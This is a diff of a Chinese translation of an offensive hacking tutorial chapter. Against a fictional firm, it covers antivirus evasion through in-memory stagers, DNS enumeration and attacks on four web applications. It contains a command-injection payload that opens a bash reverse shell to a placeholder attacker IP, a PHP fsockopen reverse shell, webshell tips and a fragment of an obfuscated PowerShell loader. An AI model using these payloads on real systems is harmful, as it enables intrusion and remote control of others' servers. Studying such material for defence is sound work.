@@ -336,25 +336,25 @@ Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.Defl
 
 防病毒软件主要基于签名来工作，即文件中被标记为恶意的特定数据包。如，防病毒软件会通过检查代码中的以下字节序列：0xFC99AADBA6143A标记恶意软件Trojan.Var.A !！。虽然有些编辑器可能具有代码分析，反转，随机性检查等高级功能，但是，实际上，核心引擎主要基于签名。
 
-除了从头开始编码恶意软件的明显替代方案之外，还可以避免与任何已知的恶意软件匹配的特征，这是有关防病毒解决方案的一个重要事实，使它们易于完全绕过。
+除了从头开始编码恶意软件的明显替代方案之外，还可以避免匹配任何已知的恶意软件的特征，这是绕过防病毒解决方案的一个重要事实。
 
-他们只扫描磁盘上的文件！如果下载恶意文件，则将其写入“下载”文件夹，并立即由防病毒软件扫描并标记。现在，如果同一恶意文件直接注入内存，只要它不接触磁盘，就会触发零警报。
+他们只扫描磁盘上的文件！如果下载恶意文件，则将其写入“下载”文件夹，并立即由防病毒软件扫描并标记。现在，如果同一恶意文件直接注入内存，只要它不接触磁盘，就不会触发告警。
 
-为此，我们可以使用一小段称为暂存器的代码将恶意代码（加密或编码）保存在变量中。然后将该代码注入到内存中新的或已经存在的进程中。这样，就不会在磁盘上写入恶意文件。简而言之，这就是我们的Excel文件正在做什么。
+为此，我们可以使用一小段称为暂存器的代码将恶意代码（加密或编码）保存在变量中。然后将该代码注入到内存中新的或已经存在的进程中。这样，就不会在磁盘上写入恶意文件。这正就是我们的Excel文件所做的。
 
-为什么防病毒软件无法检测到暂存器？有时候会这样。但是与真正的恶意软件相反，暂存器只是几行代码，可以很容易地进行调整以逃避所有签名检测.
+为什么防病毒软件无法检测到stager？有时候确实如此。与真正的恶意软件相比，stager只是几行代码，可以很容易地进行调整以逃避所有签名检测[27\].
 
 ## 2.2 公众曝光
 
-在等待网络钓鱼诈骗达到目标的同时，我们研究互联网侧以寻找访问SPH基础设施的新颖方法。在下一章中，我们将首先映射它们的所有可见机器及其提供的服务（网站，邮件服务，VPN等），然后奠定我喜欢称之为“寻找小突破的艺术”的基础 - 这种裂缝可能会给我们提供我们正在寻找的即兴邀请。
+在静候网络钓鱼攻击的果实时，我们也同时搜集互联网侧信息，寻找拿下SPH基础设施的新突破口。在下一节中，我们将先映射SPH在互联网上所有可见的存活服务器及其提供的服务（网站，邮件服务，VPN等），然后为我喜欢的“寻找小漏洞的艺术”巩固基础 - 这种漏洞可能会给我们提供我们正在寻找的临时突破口。
 
 ### 2.2.1.映射公共IP地址
 
 我们的第一个线索（就此而言，这是唯一的线索）是公司的名称：Slash＆Paul’s Holdings。我们可以轻松找到他们的主要网站，这反过来又给我们带来了第二块拼图，即公共DNS记录：sph-assets.com。
 
-但是，使用centralops.net（或domaintools.com），我们可以快速了解到，该网站的IP地址不是SPH拥有，而是Amazon拥有。因此，它不是位于Bluebox中，而是位于SPH数据中心之外的某个黑盒子当中。我们甚至不会费心去调查。 ![](.gitbook/assets/15.whoisrecord.png)
+但是，使用centralops.net（或domaintools.com），我们可以快速了解到，该网站的IP地址不是SPH拥有，而是Amazon拥有，说明它不是位于DMZ区中，而是位于SPH数据中心之外的某个暗色区域，因此我们可以忽略该线索。 ![](.gitbook/assets/15.whoisrecord.png)
 
-我们如何在Bluebox中找到真实的服务器？这很简单：我们枚举所有可能的DNS名称（\* .sph-assets.com），检查其对应的IP地址，并查看centralops.net是否将SLASH＆PAUL HOLDINGS INC列为IP段的所有者。
+我们如何在DMZ区中找到真实的服务器呢？其实很简单：我们先枚举所有可能的DNS名称（\* .sph-assets.com），再检查其对应的IP地址，并查看centralops.net是否将SLASH＆PAUL HOLDINGS INC列为IP段的所有者。
 
 诸如DNSRecon和DNScan之类的工具可自动执行此类请求，甚至提供最常用的子域列表来推动此搜索过程：Extranet.sph-assets.com，Lync.sph-assets.com，mail.sph-assets .com等
 
@@ -364,7 +364,7 @@ root@kali:~# dnsrecon -d sph-assets.com -t brt -D wordlists/domains_short.txt
 
 ![](.gitbook/assets/16.dnsrecon.png)
 
-一旦编译好域名和IP地址的列表后，我们再次查询centralops.net，以查看哪些真正位于SPH拥有的IP范围内。
+一旦整理出好域名和IP地址的列表，我们再查询centralops.net，查看哪些真正位于SPH拥有的IP范围内。
 
 就我们的场景而言，让我们假设SPH的公共IP都位于较小的子网172.31.19.0/25中，该子网承载以下Web应用程序:
 
@@ -375,11 +375,11 @@ root@kali:~# dnsrecon -d sph-assets.com -t brt -D wordlists/domains_short.txt
 
 ### 2.2.2.Web应用
 
-现在我们已经有了一个url列表，下一步是在这些网站周围寻找可以用来在服务器上执行代码的web漏洞。
+现在我们已经搜集到了一个url列表，接下来就是去找出这些网站的web漏洞来进一步执行攻击。
 
-> 提示：查找web漏洞需要检查发送到服务器的所有参数。为了正确地实现这一点，Burp Suite或ZAP等工具是最有帮助的。它们拦截每个HTTP请求并更改HTML页面的内容，以绕过一些基本的保护，如隐藏字段、未受保护字段等。它们还很好地概述了网站处理的所有参数，这些参数转化为我们可以潜在地注入恶意代码的更多输入。
+> 提示：找web漏洞需要检查发送到服务器的所有参数。为了正确执行此操作，采用Burp Suite或ZAP等工具是最有帮助的。它们拦截每个HTTP请求并更改HTML页面的内容，绕过一些基本的保护，如隐藏字段、未受保护字段等。它们还能很好地概览网站处理的所有参数，这些参数能让我们注入更多的恶意代码。
 
-#### 1\)    up.sph-assets.com
+#### 1、up.sph-assets.com
 
 第一个网站是初级的，只提供测试服务器是否启动的功能。在我看来，这是一家小型公用事业公司，由一位匆忙的管理人员组成，他想在一个懒洋洋的周日下午，在家里舒舒服服服地履行自己的职责。 ![](.gitbook/assets/17.ping.png)
 
@@ -411,7 +411,7 @@ www.google.com; bash -i >& /dev/tcp/FRONT_GUN_IP/443 0>&1
 
 > 注意：这是一个非常简单的例子来预热，但它为远程代码的执行奠定了基础。检查phpmailer上的漏洞，它遵循相同的思路:[https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html)
 
-#### 2\)    career.sph-assets.com
+#### 2、career.sph-assets.com
 
 和其他公司一样，SPH需要招聘人才来拓展业务。这个职业网站通过允许那些想要的员工上传他们的简历来达到这样的目的。
 
@@ -429,7 +429,7 @@ www.google.com; bash -i >& /dev/tcp/FRONT_GUN_IP/443 0>&1
 
 互联网上有许多可用的“webshell脚本”，它们提供了许多功能：良好的图形界面、数据库支持、文件浏览器等。然而，其中许多脚本可能带有隐藏的后门，为其他黑客提供了免费搭便车的机会。所以当心外面所有的C99或R57脚本。请保持webshell的简洁易用。
 
-#### 3\)    info.sph-assets.com
+#### 3、info.sph-assets.com
 
 这个网站似乎提供了一些关于公司历史的基本信息和一些吸引投资者的财务数字。通过与Burp Proxy的链接，我们注意到一个有趣的请求，它获取一个PDF报告: ![](.gitbook/assets/26.pdf.png)
 
@@ -463,7 +463,7 @@ IIS的配置存储在“web.config”文件中，通常是主网页上方的一�
 $sock=fsockopen("FrontGun_IP",443);exec("/bin/sh <&3 >&3 2>&3");
 ```
 
-#### 4\)    catalog.sph-assets.com
+#### 4、catalog.sph-assets.com
 
 最后一个网站似乎是SPH向其客户提供产品的主机。我们可以通过简单的ID以浏览产品列表，如下所示: ![](.gitbook/assets/33.id.png)
 
